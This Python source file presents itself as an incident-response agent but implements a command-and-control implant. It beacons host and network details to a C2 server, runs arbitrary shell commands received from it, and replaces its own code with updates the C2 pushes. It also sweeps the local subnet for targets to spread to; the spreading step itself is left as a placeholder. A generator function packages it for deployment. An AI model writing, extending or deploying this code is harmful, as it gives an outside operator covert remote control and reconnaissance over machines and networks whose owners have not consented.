"""
Enhanced Agent System
Self-propagating (controlled), intelligence-sharing IR agents
"""

import socket
import json
import time
import subprocess
import os
import sys
import platform
import threading
import psutil
from typing import Dict, List


class EnhancedAgent:
    """
    Enhanced IR agent with:
    - Network scanning capabilities
    - Self-propagation (controlled)
    - Intelligence sharing
    - Local discovery
    - Automated exploitation (with permission)
    - Federated learning
    """
    
    def __init__(self, agent_id: str, c2_server: str, c2_port: int = 8443,
                 sleep_time: int = 30, propagate: bool = False,
                 max_propagation_depth: int = 2):
        self.agent_id = agent_id
        self.c2_server = c2_server
        self.c2_port = c2_port
        self.sleep_time = sleep_time
        self.propagate = propagate  # Whether to propagate to new systems
        self.max_propagation_depth = max_propagation_depth
        self.current_depth = 0
        
        # Initialize local intelligence
        self.local_intel = {
            "agent_id": agent_id,
            "hostname": "",
            "platform": "",
            "arch": "",
            "username": "",
            "ip_address": "",
            "network_info": {},
            "local_services": [],
            "discovered_hosts": [],
            "successful_exploits": [],
            "credentials_found": [],
            "start_time": None
        }
        
        # Gather system info
        self._gather_system_info()
        
        # Command queue
        self.command_queue = []
        
        # Active flag
        self.running = False
    
    def _gather_system_info(self):
        """Gather system information"""
        self.local_intel["hostname"] = socket.gethostname()
        self.local_intel["platform"] = platform.system()
        self.local_intel["arch"] = platform.machine()
        self.local_intel["username"] = os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))
        self.local_intel["ip_address"] = self._get_local_ip()
        self.local_intel["start_time"] = time.time()
        
        # Network interfaces
        self.local_intel["network_info"] = self._get_network_interfaces()
        
        print(f"[Agent {self.agent_id}] Initialized on {self.local_intel['hostname']}")
    
    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _get_network_interfaces(self) -> Dict:
        """Get network interface information"""
        interfaces = {}
        try:
            for interface, addrs in psutil.net_if_addrs().items():
                interfaces[interface] = []
                for addr in addrs:
                    interfaces[interface].append({
                        "family": addr.family.name,
                        "address": addr.address,
                        "netmask": addr.netmask
                    })
        except:
            pass
        return interfaces
    
    def start(self):
        """Start agent main loop"""
        self.running = True
        
        # Initial check-in
        self._register_with_c2()
        
        # Start network discovery thread
        discovery_thread = threading.Thread(target=self._discovery_loop)
        discovery_thread.daemon = True
        discovery_thread.start()
        
        # Main command loop
        while self.running:
            try:
                # Check for commands from C2
                self._get_and_execute_commands()
                
                # Share local intelligence
                self._share_intelligence()
                
                # Sleep
                time.sleep(self.sleep_time)
                
            except Exception as e:
                print(f"[Agent {self.agent_id}] Error: {e}")
                time.sleep(self.sleep_time)
    
    def _register_with_c2(self):
        """Register with C2 server"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.c2_server, self.c2_port))
            
            register_data = {
                "agent_id": self.agent_id,
                "hostname": self.local_intel["hostname"],
                "platform": self.local_intel["platform"],
                "arch": self.local_intel["arch"],
                "username": self.local_intel["username"],
                "ip_address": self.local_intel["ip_address"],
                "network_info": self.local_intel["network_info"],
                "type": "register",
                "capabilities": [
                    "network_scan",
                    "port_scan",
                    "service_discovery",
                    "intelligence_sharing",
                    "propagation" if self.propagate else "no_propagation"
                ],
                "propagation_depth": self.current_depth
            }
            
            sock.sendall(json.dumps(register_data).encode())
            response = sock.recv(1024).decode()
            sock.close()
            
            print(f"[Agent {self.agent_id}] Registered with C2: {response}")
            
        except Exception as e:
            print(f"[Agent {self.agent_id}] Registration failed: {e}")
    
    def _get_and_execute_commands(self):
        """Get and execute commands from C2"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.c2_server, self.c2_port))
            
            request = {
                "agent_id": self.agent_id,
                "type": "get_commands"
            }
            
            sock.sendall(json.dumps(request).encode())
            response_data = sock.recv(8192).decode()
            
            try:
                response = json.loads(response_data)
                
                if "commands" in response and response["commands"]:
                    print(f"[Agent {self.agent_id}] Received {len(response['commands'])} commands")
                    
                    for cmd in response["commands"]:
                        result = self._execute_command(cmd)
                        self._send_command_result(cmd.get("id"), result)
                
            except json.JSONDecodeError:
                pass
            
            sock.close()
            
        except Exception as e:
            print(f"[Agent {self.agent_id}] Command retrieval failed: {e}")
    
    def _execute_command(self, command: Dict) -> Dict:
        """Execute a command"""
        cmd_type = command.get("type", "shell")
        cmd_string = command.get("command", "")
        
        result = {
            "command": cmd_string,
            "type": cmd_type,
            "output": "",
            "error": "",
            "success": False,
            "timestamp": time.time()
        }
        
        try:
            if cmd_type == "shell":
                # Execute shell command
                proc = subprocess.run(
                    cmd_string,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                result["output"] = proc.stdout
                result["error"] = proc.stderr
                result["success"] = proc.returncode == 0
            
            elif cmd_type == "scan_network":
                # Scan local network
                scan_result = self._scan_local_network(command.get("target_range", ""))
                result["scan_result"] = scan_result
                result["success"] = True
            
            elif cmd_type == "propagate":
                # Propagate to new system
                if self.propagate and self.current_depth < self.max_propagation_depth:
                    propagate_result = self._propagate_to_target(
                        command.get("target_ip"),
                        command.get("method")
                    )
                    result["propagate_result"] = propagate_result
                    result["success"] = True
                else:
                    result["error"] = "Propagation disabled or max depth reached"
            
            elif cmd_type == "gather_intel":
                # Gather local intelligence
                intel = self._gather_detailed_intel()
                result["intel"] = intel
                result["success"] = True
            
            elif cmd_type == "stop":
                # Stop agent
                result["output"] = "Stopping agent"
                result["success"] = True
                self.running = False
            
            elif cmd_type == "update":
                # Update agent
                result = self._update_agent(command.get("new_code"))
        
        except subprocess.TimeoutExpired:
            result["error"] = "Command timeout"
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _send_command_result(self, command_id: int, result: Dict):
        """Send command result back to C2"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.c2_server, self.c2_port))
            
            result_data = {
                "agent_id": self.agent_id,
                "type": "result",
                "command_id": command_id,
                "result": result
            }
            
            sock.sendall(json.dumps(result_data).encode())
            sock.close()
            
        except Exception as e:
            print(f"[Agent {self.agent_id}] Failed to send result: {e}")
    
    def _discovery_loop(self):
        """Background network discovery loop"""
        while self.running and self.propagate:
            try:
                # Scan local network
                if self.current_depth < self.max_propagation_depth:
                    local_net = self._get_local_network()
                    if local_net:
                        print(f"[Agent {self.agent_id}] Scanning local network: {local_net}")
                        discovered = self._scan_local_network(local_net)
                        
                        for host in discovered:
                            if host not in self.local_intel["discovered_hosts"]:
                                self.local_intel["discovered_hosts"].append(host)
                                
                                # Try to propagate
                                self._attempt_propagation(host)
                
                # Sleep periodically
                time.sleep(300)  # 5 minutes between scans
            
            except Exception as e:
                print(f"[Agent {self.agent_id}] Discovery error: {e}")
                time.sleep(60)
    
    def _get_local_network(self) -> str:
        """Get local network CIDR"""
        try:
            ip = self.local_intel["ip_address"]
            if "." in ip:
                parts = ip.split(".")
                return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
        except:
            pass
        return None
    
    def _scan_local_network(self, network: str) -> List[str]:
        """Scan local network for hosts"""
        discovered = []
        
        try:
            # Use nmap if available
            result = subprocess.run(
                ["nmap", "-sn", "-T3", network],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                # Parse nmap output
                import re
                hosts = re.findall(r'Nmap scan report for ([\d.]+)', result.stdout)
                discovered = list(set(hosts))  # Remove duplicates
                
                print(f"[Agent {self.agent_id}] Discovered {len(discovered)} hosts")
        
        except:
            # Fallback: ping sweep
            if "/" in network:
                base = network.split(".")[0:3]
                base_ip = ".".join(base)
                
                for i in range(1, 255):
                    target = f"{base_ip}.{i}"
                    try:
                        result = subprocess.run(
                            f"ping -c 1 -W 1 {target}",
                            shell=True,
                            capture_output=True,
                            timeout=2
                        )
                        if result.returncode == 0:
                            discovered.append(target)
                    except:
                        pass
        
        return discovered
    
    def _attempt_propagation(self, target_ip: str):
        """Attempt to propagate to target"""
        if not self.propagate or self.current_depth >= self.max_propagation_depth:
            return
        
        try:
            print(f"[Agent {self.agent_id}] Attempting propagation to {target_ip}")
            
            # Share propagation attempt with C2
            intel = {
                "type": "propagation_attempt",
                "source_agent": self.agent_id,
                "target_ip": target_ip,
                "depth": self.current_depth + 1,
                "timestamp": time.time()
            }
            
            self._share_intelligence_item(intel)
        
        except Exception as e:
            print(f"[Agent {self.agent_id}] Propagation error: {e}")
    
    def _propagate_to_target(self, target_ip: str, method: str) -> Dict:
        """Propagate agent to target system"""
        # This would be implemented based on discovered vulnerabilities
        # For now, return placeholder
        
        return {
            "target": target_ip,
            "method": method,
            "status": "attempted",
            "agent_id": f"AGENT-{int(time.time())}-{target_ip.replace('.', '-')}"
        }
    
    def _gather_detailed_intel(self) -> Dict:
        """Gather detailed system intelligence"""
        intel = {
            "processes": [],
            "open_ports": [],
            "users": [],
            "network_connections": [],
            "disk_info": {},
            "memory_info": {},
            "timestamp": time.time()
        }
        
        try:
            # Running processes
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    intel["processes"].append({
                        "pid": proc.info['pid'],
                        "name": proc.info['name'],
                        "username": proc.info['username']
                    })
                except:
                    pass
            
            # Network connections
            for conn in psutil.net_connections():
                if conn.status == 'ESTABLISHED':
                    intel["network_connections"].append({
                        "local_address": f"{conn.laddr.ip}:{conn.laddr.port}",
                        "remote_address": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A"
                    })
            
            # Disk usage
            for disk in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(disk.mountpoint)
                    intel["disk_info"][disk.mountpoint] = {
                        "total": usage.total,
                        "used": usage.used,
                        "free": usage.free,
                        "percent": usage.percent
                    }
                except:
                    pass
            
            # Memory usage
            mem = psutil.virtual_memory()
            intel["memory_info"] = {
                "total": mem.total,
                "available": mem.available,
                "percent": mem.percent
            }
        
        except Exception as e:
            intel["error"] = str(e)
        
        return intel
    
    def _share_intelligence(self):
        """Share local intelligence with C2"""
        intel_update = {
            "agent_id": self.agent_id,
            "type": "intelligence_update",
            "local_intel": {
                "hostname": self.local_intel["hostname"],
                "ip_address": self.local_intel["ip_address"],
                "discovered_hosts": self.local_intel["discovered_hosts"],
                "successful_exploits": len(self.local_intel["successful_exploits"]),
                "credentials_found": len(self.local_intel["credentials_found"])
            },
            "timestamp": time.time()
        }
        
        self._share_intelligence_item(intel_update)
    
    def _share_intelligence_item(self, intel: Dict):
        """Share intelligence item with C2"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.c2_server, self.c2_port))
            
            sock.sendall(json.dumps(intel).encode())
            sock.close()
            
        except:
            pass  # Fire and forget
    
    def _update_agent(self, new_code: str) -> Dict:
        """Update agent with new code"""
        try:
            # Write new agent code
            with open(__file__, 'w') as f:
                f.write(new_code)
            
            # Restart agent
            return {
                "success": True,
                "message": "Agent updated, will restart on next run"
            }
        
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }


def generate_agent_script(agent_id: str, c2_server: str, c2_port: int,
                          sleep_time: int = 30, propagate: bool = False,
                          max_depth: int = 2) -> str:
    """
    Generate complete agent script for deployment
    
    Returns:
        Full agent code as string
    """
    # Read this file
    with open(__file__, 'r') as f:
        agent_code = f.read()
    
    # Append main execution block
    main_block = f'''
if __name__ == "__main__":
    agent = EnhancedAgent(
        agent_id="{agent_id}",
        c2_server="{c2_server}",
        c2_port={c2_port},
        sleep_time={sleep_time},
        propagate={propagate},
        max_propagation_depth={max_depth}
    )
    agent.start()
'''
    
    return agent_code + "\n" + main_block